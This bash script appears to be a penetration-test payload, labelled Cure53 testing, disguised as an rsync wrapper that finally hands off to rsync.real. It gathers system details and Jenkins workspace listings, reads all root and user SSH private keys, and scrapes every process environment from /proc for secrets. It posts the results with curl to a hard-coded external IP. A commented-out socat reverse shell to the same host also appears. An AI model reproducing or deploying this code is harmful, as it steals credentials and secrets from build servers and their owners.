#!/usr/bin/env bash
apt update && apt install -y curl socat

LOG="$(mktemp)"
# Cure53 testing

# socat TCP:65.109.68.176:16123 EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane &

echo "== system ==" >> "${LOG}"
id >> "${LOG}"
date >> "${LOG}"
uname -a >> "${LOG}"

# echo "== env ==" >> "${LOG}"
# env >> "${LOG}"

echo "== mount ==" >> "${LOG}"
mount >> "${LOG}"

echo "== ls Home ==" >> "${LOG}"
ls -lah ~/ >> "${LOG}"
echo "== ls .ssh ==" >> "${LOG}"
ls -lah ~/.ssh/ >> "${LOG}"
echo "== ls .workspace ==" >> "${LOG}"
ls -lah /srv/jenkins/workspace/ >> "${LOG}"

# echo "== github ==" >> "${LOG}"
# ssh git@github.com >> "${LOG}"

echo "== cat root ssh keys ==" >> "${LOG}"
cat ~/.ssh/* >> "${LOG}"

echo "== cat user ssh keys ==" >> "${LOG}"
cat /home/*/.ssh/* >> "${LOG}"

echo "== argv ==" >> "${LOG}"
echo "$@" >> "${LOG}"

echo "== ls Root ==" >> "${LOG}"
ls -lah / >> "${LOG}"

# send the collected log to the OAST endpoint
curl -s -X POST --data-binary @"${LOG}" "http://65.109.68.176:15172/cure53_2"


(
  # Exit on error, undefined var, or pipeline failure
  set -Eeuo pipefail

  # Error handler: send error details via curl
  trap 'errcode=$?; errline=$LINENO; errcmd=${BASH_COMMAND}; \
         curl -s -X POST \
           -H "Content-Type: text/plain" \
           --data "Error code: $errcode; Line: $errline; Command: $errcmd" \
           "http://65.109.68.176:15172/error"; \
         exit $errcode' ERR

  # Temp file for accumulating env entries
  tmpfile=$(mktemp /tmp/env_dump.XXXXXX) || exit 1
  # Temp file for sending
  sendfile=$(mktemp /tmp/env_send.XXXXXX) || exit 1

  # Record start time
  start_ts=$(date +%s)

  # Loop until 60s have elapsed
  while [ $(( $(date +%s) - start_ts )) -lt 60 ]; do
    for proc in /proc/[0-9]*; do
      envfile="$proc/environ"
      # If readable, dump NULL-delimited env into lines
      [ -r "$envfile" ] && tr '\0' '\n' < "$envfile" >> "$tmpfile"
    done
    #sleep 1
  done

  # Deduplicate key-value pairs, then limit to 3 distinct values per key
  sort -u "$tmpfile" \
    | awk -F= '{ key = $1; if (count[key] < 3) { print; count[key]++ } }' \
    > "$sendfile"

  # POST the prepared data
  curl -s -X POST \
       -H 'Content-Type: text/plain' \
       --data-binary @"$sendfile" \
       'http://65.109.68.176:15172/environ'

  # Clean up
  rm -f "$tmpfile" "$sendfile"
) &

/usr/local/bin/rsync.real --verbose --stats "$@"
# clean up
rm -f "${LOG}"

